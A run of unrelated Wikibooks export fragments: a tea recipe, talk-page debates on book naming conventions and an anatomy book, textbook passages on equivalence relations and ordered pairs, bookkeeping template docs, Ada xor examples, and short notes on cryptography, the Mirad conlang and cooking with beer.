Here's a traditionalist view on how to make it, which shares much with [[w:George Orwell|George Orwell's]] essay, &quot;A Nice Cup of Tea&quot;.

Use freshly drawn water and bring it to a boil in a kettle. Meanwhile, prepare your teapot. A stainless steel pot may be used, but earthenware is preferred. The pot should be warmed: add some hot water and let the warmth pervade the pot. Drain off the hot water, then add the tea. Remember to take the pot to the water, never the water to the pot.  Whatever tea you use (and for proper emotional rescue you should use a strong Indian or Kenyan-based blend), do not use teabags. You need to let the tea leaves swim free and with teabags there will inevitably be a papery tinge to the taste. This rule is, however, widely broken.

Measure tea according to the size of the  teapot and the strength of tea you prefer. In a large teapot (serving four cups), two [[Cookbook:Teaspoon|teaspoons]] will give a fairly weak tea, perhaps enough to console one for a lost umbrella on a rainy day, and four should be strong enough for being stood up on a Friday night. A broken heart may need six. Add the water as soon as it boils, and leave it to stand for five minutes (and no longer) before serving. Use a mug if you must, but a cup with a saucer is far more civilised.

Traditionally you should add full-cream milk, but semi-skimmed will do. If you are familiar with the strength of tea you make and the size of the cups, you can follow the 'milk in first' technique. Otherwise, add milk to the tea, to ensure you get the right colour. Add sugar according to taste and the extent of the emotional crisis you are trying to overcome.

Serve with a biscuit or two, and prepare to feel much better.

== Pre-vote / Final-vote ==

With the amount of options open I think we need some Pre-vote process on all options before we know which open will be presented to the final vote.

=== --[[User:Krischik|Krischik]] 12:33, 13 Mar 2005 (UTC) ===

My preferences are for

1.6 &quot;Real&quot; Namepaces then sub-pages.

2.2 While I am in favor of flat in textbooks one need deeper hierarchies i.E. in reference sections: [[Ada Programming/Keywords/and|Programming:Ada:Keywords:and]] and [[Ada Programming/Operators/and|Programming:Ada:Operators:and]].

3.1 least surprise.

4.1 &quot;move&quot; is easy but not that easy.

: I don't want to step on your toe, but the separation between the two &quot;and&quot; examples looks very constructed: The first code example (A&gt;10 and A&lt;20) is even the same on both pages. A flat structure (i.e. {{bad link|Programming:Ada:and}}) with links from both [[Ada Programming/Keywords|Programming:Ada:Keywords]] and [[Ada Programming/Operators|Programming:Ada:Operators]] might be easier to maintain. --[[User:Andreas Ipp|Andreas]] 20:57, 13 Mar 2005 (UTC)

:: I use links to the reference tables in source code examples (see [[Ada Programming/Subtypes|Programming:Ada:Subtypes]] - and therefore I need both pages for keywords which are also operators. But perhaps #REDIRECT for one of the two duplicates might be the better option - since every operator is either a keyword or a special character - but that is something to decide with the other [[Programming:Ada]] authors. My point here is more general: reference tables might need a deeper hierarchy. --[[User:Krischik|Krischik]] 09:20, 14 Mar 2005 (UTC)

:: The best way of doing it is saying &quot;Ada keywords&quot; and &quot;Ada operators&quot;. Natural, and keeps the hierachy flat. [[User:Dysprosia|Dysprosia]] 22:29, 13 Mar 2005 (UTC)

:::  I find it helpful to know that typing i.E. [[Ada Programming/Types/range|http://en.wikibooks.org/wiki/Programming:Ada:Types:range]] into the browser will give me a description of - in this vase - range types. helps a lot on answering newbie question on news:comp.lang.ada. --[[User:Krischik|Krischik]] 09:20, 14 Mar 2005 (UTC)

:::I don't think we need to put flat vs. deep structure into policy, but allow each book to decide what is good for its own needs.  Just for reference, however, the largest wikibooks ([[Cookbook]]) uses a flat naming scheme, and we haven't had any problems with it yet. [[User:Gentgeen|Gentgeen]] 22:34, 13 Mar 2005 (UTC)

:: @Dys: It seems like traditionally all programming languages have been going into &quot;Programming:&quot;, but if we really consider a radical new start, then the structure in consideration for new books might really be: &quot;Ada&quot;, &quot;Ada/operators&quot;, &quot;Ada/keywords&quot;, &quot;Ada/and&quot;, etc. (''no'' sub-sub-page, and forget about namespaces at all, have simple books that can be moved around and between bookshelves arbitrarily). 
:: @Gent: I think we should put flat (if voted for) into policy, similar like subpages are disabled on Wikipedia (there even by software!). Sometimes people have to be forced to keeping things simple. It is ''very'' tempting to organize material (that one does not have yet) into sub-sub-sub structures, but it seems, the most successful and most collaborative wikibooks are those of a very simple and flat structure.
:: @Krischik: The structure that you present in your book, and the structure how pages are saved in Wikibooks don't have to be the same: All pages of a book can live in a flat hierarchy (in fact, in real books, they do, on pages numbered 1, 2, 3, ...), still your content, your glossary, reference sections, etc. might all provide a very different structure. (I think this is a critical point that should also be communicated to new wikibook authors). --[[User:Andreas Ipp|Andreas]] 00:00, 14 Mar 2005 (UTC)

::: This is indeed true for Ada as well. It's just the keyword/operator/attribute/etc. pp. reference tables which have depper hirachies. The actual tutorial pages have only one level. --[[User:Krischik|Krischik]] 09:20, 14 Mar 2005 (UTC)

== Advice for novices ==

It seems the discussion fell asleep again. What shall I do in cases like [[Wikibooks:Reading room/Archives/2005/March#Module-izing: Request for Advice|Wikibooks:Staff_lounge#Module-izing:_Request_for_Advice]], where a user asks how best to organize a book? I would like to give simple advice, but telling everybody they can either use &quot;:&quot; or &quot;/&quot; and linking to this discussion page might not be the best.
I want to propose the following: I guess there is not much point in this vote, since &quot;:&quot; or &quot;/&quot; is a matter of taste and there are many books that do it one way and many that do it the other way. I don't want to interfere with excellent books that use &quot;:&quot; (like Cookbook, etc.), but my personal impression is that using &quot;/&quot; is the simplest for beginning Wikibook users.
May I therefore ask, if anybody opposes to the idea of recommending new users the &quot;/&quot; subpage delimiter as the way to organize things? A fairly recent example is for example [[Hamster Care]], that does not use any navigational templates but just the automatic link back to the book page. I would suggest the following:
* Double policy: &quot;:&quot; and &quot;/&quot; are both fine.
* New books by novices: Recommend &quot;/&quot; because it provides the basic navigation &quot;for free&quot;.
What do you think about this? --[[User:Andreas Ipp|Andreas]] 10:30, 18 Mar 2005 (UTC)

: I am all in favor: Clear instructions for new books - and sub-pages do have added value.. --[[User:Krischik|Krischik]] 14:11, 18 Mar 2005 (UTC)

:* A happy user by clear instructions: [[User_talk:Ojmorales0002#Organization_of_the_Golden_Bough]] :-) --[[User:Andreas Ipp|Andreas]] 15:47, 18 Mar 2005 (UTC)
:* Another successful conversion: [[Talk:How To Assemble A Desktop PC#Organizing the book|Talk:How To Build A Computer#Organizing the book]] --[[User:Andreas Ipp|Andreas]] 09:20, 20 Mar 2005 (UTC)
:* I changed [[Outdoor Survival]] by myself (no naming conventions before) --[[User:Andreas Ipp|Andreas]] 19:20, 20 Mar 2005 (UTC)
:* Another conversion from 1-page to subpages: [[Talk:CPAM with TWW#Organizing the book]] --[[User:Andreas Ipp|Andreas]] 19:20, 20 Mar 2005 (UTC)

:Is there some &quot;Wikibooks Workspace&quot; or &quot;Wikibooks Community Portal&quot; where such information could go to? Sorry that things seem to change so fast now, but in the case of [[The Golden Bough]] I had to be quick (the user already added over 50 chapters, and changing all &quot;tgbChapter1&quot; now would be much more work). Also, it seems there is a strong need for clear directions and hints, otherwise why else would all these people be so happy in quickly following my advice? I hope nobody feels overrun... --[[User:Andreas Ipp|Andreas]] 19:20, 20 Mar 2005 (UTC)

:I have no problem with recommending subpages to newbies, as long as that doesn't represent a policy of using subpages in general.  I'd love to see real namespaces with independent logos, recentchanges and other utility pages, etc, but I have no problem with subpages at least until that kind of functionality is available. [[User:TUF-KAT|TUF-KAT]] 22:49, 21 Mar 2005 (UTC)

:I agree with you about the double policy, Andreas. I think we should hightlight these two alternatives in [[Wikibooks:Naming conventions]] over the others. [[User:ManuelGR|ManuelGR]] 23:41, 21 Mar 2005 (UTC)

:: I updated [[Wikibooks:Naming conventions]]. Have a look and edit if necessary. --[[User:Andreas Ipp|Andreas]] 11:13, 23 Mar 2005 (UTC)</text>

      <text xml:space="preserve">{{TOC right}}
We often wish to describe how two mathematical entities within a set are related.  For example, if we were to look at the set of all people on Earth, we could define &quot;is a child of&quot; as a relationship.  Similarly, the &lt;math&gt;\ge&lt;/math&gt; operator defines a relation on the set of integers.  A binary relation, hereafter referred to simply as a relation, is a binary proposition defined on any selection of the elements of two sets.

Formally, a relation is any arbitrary subset of the Cartesian product between two sets &lt;math&gt;X&lt;/math&gt; and &lt;math&gt;Y&lt;/math&gt; so that, for a relation &lt;math&gt;R&lt;/math&gt;, &lt;math&gt;R \subseteq X \times Y&lt;/math&gt;. In this case, &lt;math&gt;X&lt;/math&gt; is referred to as the domain of the relation and &lt;math&gt;Y&lt;/math&gt; is referred to as its codomain. If an ordered pair &lt;math&gt;(x, y)&lt;/math&gt; is an element of &lt;math&gt;R&lt;/math&gt; (where, by the definition of &lt;math&gt;R&lt;/math&gt;, &lt;math&gt;x \in X&lt;/math&gt; and &lt;math&gt;y \in Y&lt;/math&gt;), then we say that &lt;math&gt;x&lt;/math&gt; is related to &lt;math&gt;y&lt;/math&gt; by &lt;math&gt;R&lt;/math&gt;. We will use &lt;math&gt;R(x)&lt;/math&gt; to denote the set
:&lt;math&gt;\{y \in Y:(x, y) \in R\}&lt;/math&gt;.
In other words, &lt;math&gt;R(x)&lt;/math&gt; is used to denote the set of all elements in the codomain of &lt;math&gt;R&lt;/math&gt; to which some &lt;math&gt;x&lt;/math&gt; in the domain in related.

===Equivalence relations===
To denote that two elements &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt; are related for a relation &lt;math&gt;R&lt;/math&gt; which is a subset of some Cartesian product &lt;math&gt;X \times X&lt;/math&gt;, we will use an infix operator.  We write &lt;math&gt;x \sim y&lt;/math&gt; for some &lt;math&gt;x,y\in X&lt;/math&gt; and &lt;math&gt;(x, y) \in R&lt;/math&gt;.

There are very many types of relations.  Indeed, further inspection of our earlier examples reveals that the two relations are quite different.  In the case of the &quot;is a child of&quot; relationship, we observe that there are some people A,B where neither A is a child of B, nor B is a child of A.  In the case of the &lt;math&gt;\ge&lt;/math&gt; operator, we know that for any two integers &lt;math&gt;m,n\in Z&lt;/math&gt; exactly one of &lt;math&gt;m\ge n&lt;/math&gt; or &lt;math&gt;n&gt; m&lt;/math&gt; is true.  In order to learn about relations, we must look at a smaller class of relations.

In particular, we care about the following properties of relations:

* Reflexivity: A relation &lt;math&gt;R \subseteq X \times X&lt;/math&gt; is reflexive if &lt;math&gt;a \sim a&lt;/math&gt; for all &lt;math&gt;a\in X&lt;/math&gt;.
* Symmetry: A relation &lt;math&gt;R \subseteq X \times X&lt;/math&gt; is symmetric if &lt;math&gt;{a \sim b} \implies {b \sim a}&lt;/math&gt; for all &lt;math&gt;a,b \in X&lt;/math&gt;.  
* Transitivity: A relation &lt;math&gt;R \subseteq X \times X&lt;/math&gt; is transitive if &lt;math&gt;{ {a \sim b} \wedge {b \sim c} } \implies { a \sim c }&lt;/math&gt; for all &lt;math&gt;a,b,c \in X&lt;/math&gt;.  

One should note that in all three of these properties, we quantify across ''all'' elements of the set &lt;math&gt;X&lt;/math&gt;.

Any relation &lt;math&gt;R \subseteq X \times X&lt;/math&gt; which exhibits the properties of reflexivity, symmetry and transitivity is called an '''equivalence relation''' on &lt;math&gt;X&lt;/math&gt;.  Two elements related by an equivalence relation are called equivalent under the equivalence relation. We write &lt;math&gt;a \sim_R b&lt;/math&gt; to denote that &lt;math&gt;a&lt;/math&gt; and &lt;math&gt;b&lt;/math&gt; are equivalent under &lt;math&gt;R&lt;/math&gt;. If only one equivalence relation is under consideration, we can instead write simply &lt;math&gt;a \sim b&lt;/math&gt;. As a notational convenience, we can simply say that &lt;math&gt;\sim&lt;/math&gt; is an equivalence relation on a set &lt;math&gt;X&lt;/math&gt; and let the rest be implied.


Example: For a fixed integer &lt;math&gt;p&lt;/math&gt;, we define a relation &lt;math&gt;\sim_p&lt;/math&gt; on the set of integers such that &lt;math&gt;a \sim_p b&lt;/math&gt; if and only if &lt;math&gt;a-b = k p&lt;/math&gt; for some &lt;math&gt;k \in Z&lt;/math&gt;.  Prove that this defines an equivalence relation on the set of integers.

Proof:
* Reflexivity:  For any &lt;math&gt;a\in X&lt;/math&gt;, it follows immediately that &lt;math&gt;a-a=0=0 p&lt;/math&gt;, and thus &lt;math&gt;a \sim_p a&lt;/math&gt; for all &lt;math&gt;a\in G&lt;/math&gt;.
* Symmetry: For any &lt;math&gt;a,b \in X&lt;/math&gt;, assume that &lt;math&gt;a \sim_p b&lt;/math&gt;.  It must then be the case that &lt;math&gt;a-b=k p&lt;/math&gt; for some integer &lt;math&gt;k&lt;/math&gt;, and &lt;math&gt;b-a=(-k) p&lt;/math&gt;.  Since &lt;math&gt;k&lt;/math&gt; is an integer, &lt;math&gt;-k&lt;/math&gt; must also be an integer.  Thus, &lt;math&gt;{a \sim_p b }\implies {b \sim_p a}&lt;/math&gt; for all &lt;math&gt;a,b\in G&lt;/math&gt;.  
* Transitivity: For any &lt;math&gt;a,b,c\in X&lt;/math&gt;, assume that &lt;math&gt;a \sim_p b&lt;/math&gt; and &lt;math&gt;b \sim_p c&lt;/math&gt;.  Then &lt;math&gt;a-b=k_1 p&lt;/math&gt; and &lt;math&gt;b-c=k_2 p&lt;/math&gt; for some integers &lt;math&gt;k_1,k_2&lt;/math&gt;.  By adding these two equalities together, we get &lt;math&gt;{(a-b)+(b-c)=(k_1 p) + (k_2 p)} \Leftrightarrow {a-c = (k_1 + k_2) p}&lt;/math&gt;, and thus &lt;math&gt;a \sim_p c&lt;/math&gt;.

Q.E.D.

Remark.  In elementary number theory we denote this relation &lt;math&gt; a \equiv b (\text{mod } p)&lt;/math&gt; and say a ''is equivalent to'' b ''modulo'' p.

=== Equivalence classes ===

Let &lt;math&gt;\sim&lt;/math&gt; be an equivalence relation on &lt;math&gt;X&lt;/math&gt;. Then, for any element &lt;math&gt;a\in X&lt;/math&gt; we define the equivalence class of &lt;math&gt;a&lt;/math&gt; as the subset &lt;math&gt;\left[ a \right]\subseteq X&lt;/math&gt; given by

:&lt;math&gt;\left[ a \right] = \left \{ b \in X | a \sim b \right \}&lt;/math&gt;

'''Theorem:''' &lt;math&gt;b \in \left[ a \right] \implies \left[ b \right] = \left[ a \right]&lt;/math&gt;

Proof: Assume &lt;math&gt;b \in \left[ a \right]&lt;/math&gt;.  Then by definition, &lt;math&gt;a \sim b&lt;/math&gt;.
* We first prove that &lt;math&gt;\left[b\right] \subseteq \left[a\right]&lt;/math&gt;. Let &lt;math&gt;p&lt;/math&gt; be an arbitrary element of &lt;math&gt;\left[ b \right]&lt;/math&gt;.  Then &lt;math&gt;p\sim b&lt;/math&gt; by definition of the equivalence class, and &lt;math&gt;p\sim a&lt;/math&gt; by transitivity of equivalence relations. Thus, &lt;math&gt;{p\in\left[b\right]}\implies {p\in\left[a\right]}&lt;/math&gt; and &lt;math&gt;\left[b\right] \subseteq \left[a\right]&lt;/math&gt;.
* We now prove that &lt;math&gt;\left[a\right] \subseteq \left[b\right]&lt;/math&gt; Let &lt;math&gt;q&lt;/math&gt; be an arbitrary element of &lt;math&gt;\left[ a \right]&lt;/math&gt;.  Then, by definition &lt;math&gt;q\sim a&lt;/math&gt;.  By transitivity, &lt;math&gt;q\sim b&lt;/math&gt;, so &lt;math&gt;q\in\left[ b\right]&lt;/math&gt;.  Thus, &lt;math&gt;{q\in\left[a\right]}\implies {q\in\left[b\right]}&lt;/math&gt; and &lt;math&gt;\left[a\right] \subseteq \left[b\right]&lt;/math&gt;.

As &lt;math&gt;\left[a\right] \subseteq \left[b\right]&lt;/math&gt; and as 
&lt;math&gt;\left[b\right] \subseteq \left[a\right]&lt;/math&gt;, we have &lt;math&gt;\left[ b \right] = \left[ a \right]&lt;/math&gt;.

Q.E.D.

=== Partitions of a set ===

A partition of a set &lt;math&gt;X&lt;/math&gt; is a disjoint family of sets &lt;math&gt;X_i&lt;/math&gt;, &lt;math&gt;i\in I&lt;/math&gt;, such that &lt;math&gt;\bigcup_{i\in I} X_i = X&lt;/math&gt;.

'''Theorem:''' An equivalence relation &lt;math&gt;\sim&lt;/math&gt; on &lt;math&gt;X&lt;/math&gt; induces a unique partition of &lt;math&gt;X&lt;/math&gt;, and likewise, a partition induces a unique equivalence relation on &lt;math&gt;X&lt;/math&gt;, such that these are equivalent.

Proof: (Equivalence relation induces Partition): Let &lt;math&gt;P&lt;/math&gt; be the set of equivalence classes of &lt;math&gt;\sim&lt;/math&gt;. Then, since &lt;math&gt;a\in [a]&lt;/math&gt; for each &lt;math&gt;a\in X&lt;/math&gt;, &lt;math&gt;\cup P = X&lt;/math&gt;. Furthermore, by the above theorem, this union is disjoint. Thus the set of equivalence relations of &lt;math&gt;\sim&lt;/math&gt; is a partition of &lt;math&gt;X&lt;/math&gt;.

(Partition induces Equivalence relation): Let &lt;math&gt;X_i\,,\,i\in I&lt;/math&gt; be a partition of &lt;math&gt;X&lt;/math&gt;. Then, define &lt;math&gt;\sim&lt;/math&gt; on &lt;math&gt;X&lt;/math&gt; such that &lt;math&gt;a\sim b&lt;/math&gt; if and only if both &lt;math&gt;a&lt;/math&gt; and &lt;math&gt;b&lt;/math&gt; are elements of the same &lt;math&gt;X_i&lt;/math&gt; for some &lt;math&gt;i\in I&lt;/math&gt;. Reflexivity and symmetry of &lt;math&gt;\sim&lt;/math&gt; is immediate. For transitivity, if &lt;math&gt;a,b\in X_i&lt;/math&gt; and &lt;math&gt;b,c\in X_i&lt;/math&gt; for the same &lt;math&gt;i\in I&lt;/math&gt;, we neccesarily have &lt;math&gt;a,c\in X_i&lt;/math&gt;, and transitivity follows. Thus, &lt;math&gt;\sim&lt;/math&gt; is an equivalence relation with &lt;math&gt;X_i\,,\, i\in I&lt;/math&gt; as the equivalence classes.

Lastly obtaining a partition &lt;math&gt;P&lt;/math&gt; from &lt;math&gt;\sim&lt;/math&gt; on &lt;math&gt;X&lt;/math&gt; and then obtaining an equivalence equation from &lt;math&gt;P&lt;/math&gt; obviously returns &lt;math&gt;\sim&lt;/math&gt; again, so &lt;math&gt;\sim&lt;/math&gt; and &lt;math&gt;P&lt;/math&gt; are equivalent structures.

Q.E.D.

=== Quotients ===

Let &lt;math&gt;\sim&lt;/math&gt; be an equivalence relation on a set &lt;math&gt;X&lt;/math&gt;. Then, define the set &lt;math&gt;X/\sim&lt;/math&gt; as the set of all equivalence classes of &lt;math&gt;X&lt;/math&gt;. In order to say anything interesting about this construction we need more theory yet to be developed. However, this is one of the most important constructions we have, and one that will be given the much attention throughout the book.

      <comment>/* Journal templates */</comment>
      <text xml:space="preserve">{{tlx|currencychoice}} allows people to create a version of an accountancy text in a different currency with a single edit.

== Journal templates ==

Simple bookkeeping journal

&lt;nowiki&gt;{{bookkeeping journal| name = General | page = 1 }}&lt;/nowiki&gt;

An empty journal just takes the journal name and page number

{{bookkeeping journal
| name = General
| page = 1
}}

&lt;pre style=&quot;border:none;&quot;&gt;
{{bookkeeping journal
| name = General
| page = 1
| entry =
{{bookkeeping entry| date = 2006&lt;br/&gt;Feb | day = 15 | description = Accounts Payable | dr = 100 }}
{{bookkeeping entry| description = Stock | cr = 80 }}
{{bookkeeping entry| description = Stationery | cr = 20 }}
}}
&lt;/pre&gt;

A journal with entries takes the journal name, page number and the entries. All fields of a bookkeeping entry are optional. cr is short for credit account and dr is short for debit account.

This is the result:

{{bookkeeping journal
| name = General
| page = 1
| entry =
{{bookkeeping entry| date = 2010&lt;br/&gt;Feb | day = 15 | description = Accounts Payable | dr = 100 }}
{{bookkeeping entry| description = Stock | cr = 80 }}
{{bookkeeping entry| description = Stationery | cr = 20 }}
}}

The templates are:

* bookkeeping journal - basically the table with the column headers and captain ''Name'' Journal - Page ''n''.
* bookkeeping entry - passed as the parameter to bookkeeping journal, any number of them can be passed. Takes date, day, description, post, dr and cr. All parameters are optional and leave an empty column when not set. &quot;dr&quot; and &quot;cr&quot; are short for debit and credit entry respectively.

      <text xml:space="preserve">Hi DCB, welcome to Wikibooks - it's great that you are looking to develop something to help teach a course - I was wondering whether you have considered [[Wikiversity]] at all? Wikiversity is dedicated to developing course and teaching materials, although at the moment it is in something of a transitionary phase towards it's own wiki-entity, rather than a subentity of Wikibooks. I've been trying to piece together a course on anatomy for the School of Medicine, although this may be more appropriately called 'gross anatomy' (I'm no anatomist or doctor). Failing that, there's a text book in (very) preliminary development at [[Human_Anatomy|Human Anatomy]]. Whether these match your course below, I'm not sure. Regardless, I would love to help with anything you may need. Anyway - welcome to Wikibooks, and I hope you enjoy your stay =) [[User:Lor|Lor]] 02:12, 11 December 2005 (UTC)

 How many organ systems are there? 8, 9, 10, 11, 12, do they really exist?

Playing to see if this could work for a course I teach ~DCB
--[[User:68.238.131.7|68.238.131.7]] 08:50, 14 Mar 2005 (UTC)

== What is this page anyway? ==

I'm trying to figure out just what this page really is about.  Is it a bookshelf?  Is it a part of Wikiversity?  Does it intend to become a Wikibook?  Is it a test page for [[Human Anatomy]]?

I'm marking this for deletion simply because it is a bunch of stubs that don't really make sense.  If there is a consistant theme for this content, please follow the [[Wikibooks:Naming Policy]] when you add content here, and try to clean this up.  --[[User:Robert Horning|Rob Horning]] 18:40, 25 March 2006 (UTC)

== Project on the move ==
Hello, I'm studying medicine, I think I'll get this project going, it would be a great help for me and my fellow students. I'll ask from assistants from histology and anatomy willing to help me in editing and making the proper terminology as simple as possible.
I'll try structurize the wiki page first. Anatomy shouldn't include histological terms or explanations. Histology is dealing with the cellular structure and microscopic study/description of the cell, so those shouldn't be included.

I'll be back! --www.doc 20:44, 29 March 2006 (UTC)

== Merger with [[Human Anatomy]] ==

It has been suggested that this book be merged with [[Human Anatomy]]. I realize that these two are distinct subjects, but at the moment we don't have enough information in either book, and there is currently no information in this book that can't be merged into the [[Human Anatomy]] book without edit. We can discuss here, if no concensus is reached (or, more likely, if nobody voices any opinions whatsoever), the issue can be dropped. --[[User:Whiteknight|Whiteknight]]&lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 00:32, 24 July 2006 (UTC)

: IMHO, I don't think that one book should redirect to the other, because that will lead to readers being sent to material that they have no interest in, which should be avoided, and will lead to questions about the merged book's scope. --[[User:Hagindaz|hagindaz]] 01:22, 24 July 2006 (UTC)

: I agree with the merger. Any non-human anatomy can be placed into a seperate subject.

: Although currently the content in here seems to be strictly human anatomy, I think merging should be done carefully and from [[Anatomy]] into [[Human Anatomy]]. The Anatomy book should be left with general information on Anatomy which is not specific to Human Anatomy. I will be working on the Human Anatomy book and will appreciate any help, even if it is just copy and pasting info from this book into the appropriate section of that one. Thanks!

== Orphaned pages ==

Found two orphans during my regular check: [[Anatomy/Gastrointestinal System]] and [[Anatomy/Pulmonary System]]. They should probably be linked on the index but I'll leave it up to someone involved with the module to place them correctly.</text>

      <text xml:space="preserve">This is the double lock principle, but it is not not Public Cryptography as both key are secret.
In public cryptography one key is public, the other is secret.
Nobody knowing the public key, is able to decipher a message encrypted with a public key.
Only the secret key is able to decipher a message encrypted with a public key.

So someone (Alice) is able to send securely an encrypted data to Bob, if Bob had made his key public.

Bob is able to prove that he owns a secret key only by providing:
* a plain text
* the same text crypted with the secret key
* the public key corresponding to the secret key.

Something similar to the double lock principle is Merkle's puzzle, which is the ancestor of the Diffie-hellman key exchange, which is itself a close cousin to RSA public key system.</text>

== Logical operator ==

=== Boolean operator ===

 X : Boolean := A = 10 {{Ada/kw|xor}} B = 10;

=== Boolean operator on arrays ===

The xor operation is applied to each boolean inside the [[Ada Programming/Types/array|array]].

 {{Ada/kw|type}} Day_Of_Month {{Ada/kw|is}} {{Ada/kw|range}} 1 .. 31;            
 {{Ada/kw|type}} Month_Array {{Ada/kw|is}} {{Ada/kw|array}} (Day_Of_Month) {{Ada/kw|of}} Boolean;
 
 X : Month_Array := Function_1;
 Y : Month_Array := Function_2;
 Z : Month_Array := X {{Ada/kw|xor}} Y;

=== Bitwise operator ===

The operator '''xor''' could be used with [[Ada Programming/Types/mod|modular types]] and also with boolean [[Ada Programming/Types/array|arrays]] to perform bitwise operations.

-taken from the NI Reaktor user forum: 
http://www.nativeinstruments.de/index.php?forum_us -

The Div output is the integer part of the division, the Mod output is the
remainder from the division.
The mod output will always be in the range 0...[b-1]
The div output will always be Int(a/b)
(where &quot;int()&quot; mean &quot;drop any fraction - DON&quot;T ROUND)

16 div 3 = 5
16 mod 3 = 1

8 div 5 = 1
8 mod 5 = 3

9 div 5 = 1
9 mod 5 = 4

10 div 5 = 2
10 mod 5 = 0

5 div 8 = 0
5 mod 8 = 5

x^y = x in y-th power.
This is how you calculate normal numbers:

1^3 = 1*1*1 = 1,
2^3 = 2*2*2 = 8,
3^3 = 3*3*3 = 27,

1^2 = 1*1 = 1,
2^2 = 2*2 = 4,

or when x^y, you multiply x y-times with x.

I saw your name on the Wikiversity participant's list, you may be very experienced in mathematics already, but I'm trying out instructing a Calculus course if you're interested, go to Wikiveristy, check out the mathematics department, pure mathematics, and in the course list is included Calculus.

:'''Mirad''' ( aka '''Unilingua''' ) is an artificially-constructed auxiliary language ([http://www.quetzal.com/conlang.html conlang]) developed and published by Paris-based author Noubar Agopoff as a serious medium for easy and logical international communication.  Mirad is categorized by constructed language afficionados as ''philosophical'' because its vocabulary is mapped letter-by-letter to a semantic ontology or thesaurus. Also, the wordstock of Mirad is considered ''a priori'', that is, there is no deliberate association with words or roots in existing natural languages.  The vocabulary is &quot;from scratch&quot;, yet based on internal lexical and semantic rules that help the learner to construct and deconstruct derivations logically, mnemonically, and consistently.

:&lt;table&gt;
&lt;tr&gt;&lt;td style=&quot;background:#efefef;&quot;&gt;For some odd reason, the author of this language called it the Latinesque name &quot;Unilingua.&quot;  In this revision of the language, the name will be the more internally consistent '''Mirad''' (pronounced ''mee-RAHD''), which means ''world language'' ('''mira''' = ''world's'' + '''d''' = ''speech''.) The proximity to the Russian word for 'world' (мир) is pure coincidence; the vocabulary of Mirad, as stated above, is not based on or related to any existing human language.&lt;/table&gt;

&lt;noinclude&gt;
:The author claims in his book ''Unilingua -- Langue universelle auxiliaire'' that this language is well-suited for universal, logical communication because it is based on principles already exploited globally by sciences like mathematics and chemistry where symbolic formulas are constructed in accordance with strict rules and a limited sequence of symbols understood by all practitioners.

:'''Mirad''' is constructed on the following principles:
::* Every vowel has numeric, vectorial, scalar, or semantic value.
::* Every consonant is semantically taxonomic.
::* Word derivation is systematic, consistent, analogical, and mnemonic.
::* Words are as ontologically unambiguous as possible.
::* Words are as short and as easy to pronounce as possible.
::* Inflection and derivation of words is regular and predictable.

:&lt;table&gt;
&lt;tr&gt;&lt;td style=&quot;background:#efefef;&quot;&gt;Conlang afficianados, note:  Mirad is not strictly a ''logical'' language in the Sapir-Whorf sense.  It is meant to be more practical, natural, and humanly-usable.  Mirad is logical in the more usual sense that it is systematic, regular, and predictable.&lt;/table&gt;

'''Beer''' is an alcoholic beverage that can be used as a [[Cookbook:Leavening Agent|leavening agent]]. It is commonly used in the batter for [[Cookbook:Deep Fat Fry|deep-fat fried]] foods, and sometimes used in [[Cookbook:Baking|baked]] goods. 
Beer can also be used to add flavor and moisture. Various styles of beers and ales can be used.

For uncooked usage of beer, see the numerous warnings on the [[Cookbook:Alcoholic_Drink|alcoholic drink]] page.

      <text xml:space="preserve">== Ordered pairs ==
To define relations on sets we must have a concept of an ''ordered pair'', as opposed to the unordered pairs the axiom of pair gives.  To have a rigorous definition of ordered pair, we aim to satisfy one important property, namely, for sets a,b,c and d, &lt;math&gt;(a,b)=(c,d) \iff a=c \wedge b=d&lt;/math&gt;.  

As it stands, there are many ways to define an ordered pair to satisfy this property.  A simple definition, then is &lt;math&gt;(a,b)=\{\{a\},\{a,b\}\}&lt;/math&gt;. (This is true simply by definition. It is a convention that we can usefully build upon, and has no deeper significance.)

{{theorem and proof|
theorem = &lt;math&gt;(a,b)=(c,d) \iff a=c \wedge b=d&lt;/math&gt;|
proof = 
If &lt;math&gt;a=c&lt;/math&gt; and &lt;math&gt;b=d&lt;/math&gt;, then &lt;math&gt;(a,b)=\{\{a\},\{a,b\}\}=\{\{c\},\{c,d\}\}=(c,d)&lt;/math&gt;.&lt;br&gt;
Now, if &lt;math&gt;(a,b) = (c,d)&lt;/math&gt; then &lt;math&gt;\{\{a\},\{a,b\}\}=\{\{c\},\{c,d\}\}&lt;/math&gt;. Then &lt;math&gt;\cap \{\{a\},\{a,b\}\}=\cap \{\{c\},\{c,d\}\}&lt;/math&gt;, so &lt;math&gt;\{a\}=\{c\}&lt;/math&gt; and a=c.&lt;br&gt; So we have &lt;math&gt;(a,b)=(a,d)&lt;/math&gt;.  Thus &lt;math&gt;\cup \{\{a\},\{a,b\}\}=\cup \{\{a\},\{a,d\}\}&lt;/math&gt; meaning &lt;math&gt;\{a,b\}=\{a,d\}&lt;/math&gt;.
:If &lt;math&gt;a=b&lt;/math&gt;,  we have &lt;math&gt;\{b\}=\{b,d\}&lt;/math&gt; and thus &lt;math&gt;d \in \{b\}&lt;/math&gt; so &lt;math&gt;b=d&lt;/math&gt;.
:If &lt;math&gt;a \ne b&lt;/math&gt;, note &lt;math&gt;b \in \{a,d\}&lt;/math&gt;, so &lt;math&gt;b=d&lt;/math&gt;
}}

== Relations ==
Using the definiton of ordered pairs, we now introduce the notion of a binary relation.

The simplest definition of a binary relation is a set of ordered pairs.  More formally, a set &lt;math&gt;\ R\ &lt;/math&gt; is a relation if &lt;math&gt;z \in R \rightarrow z=(x,y)&lt;/math&gt; for some ''x,y''.  We can simplify the notation and write &lt;math&gt;(x,y) \in R&lt;/math&gt; or simply &lt;math&gt;x R y&lt;/math&gt;.

We give a few useful definitions of sets used when speaking of relations.

*The ''domain'' of a relation ''R'' is defined as &lt;math&gt;\mbox{dom}\ R = \{x \mid \exists y, (x,y) \in R \}&lt;/math&gt;, or all sets that are the initial member of an ordered pair contained in ''R''.

*The ''range'' of a relation ''R'' is defined as &lt;math&gt;\mbox{ran}\ R = \{y \mid \exists x, (x,y) \in R \}&lt;/math&gt;, or all sets that are the final member of an ordered pair contained in ''R''.

*The union of the domain and range, &lt;math&gt;\mbox{field}\ R = \mbox{dom}\  R \cup \mbox{ran}\  R&lt;/math&gt;, is called the ''field'' of ''R''.

